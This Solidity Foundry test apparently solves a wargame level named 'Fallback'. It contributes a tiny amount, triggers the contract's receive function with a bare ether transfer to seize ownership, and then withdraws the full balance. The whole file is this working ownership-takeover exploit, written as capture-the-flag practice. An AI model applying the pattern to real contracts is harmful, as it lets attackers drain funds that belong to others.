// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Fallback.sol";

contract FallbackTest is Test {
    Fallback internal _fallback;

    function setUp() public {
        _fallback = new Fallback();
    }

    receive() external payable {}

    function test_attack() public {
        _fallback.contribute{value: 1}();

        (bool ok,) = address(_fallback).call{value: 1}("");
        assertTrue(ok);

        _fallback.withdraw();

        assertEq(_fallback.owner(), address(this), "owner");
        assertEq(address(_fallback).balance, 0, "balance");
    }
}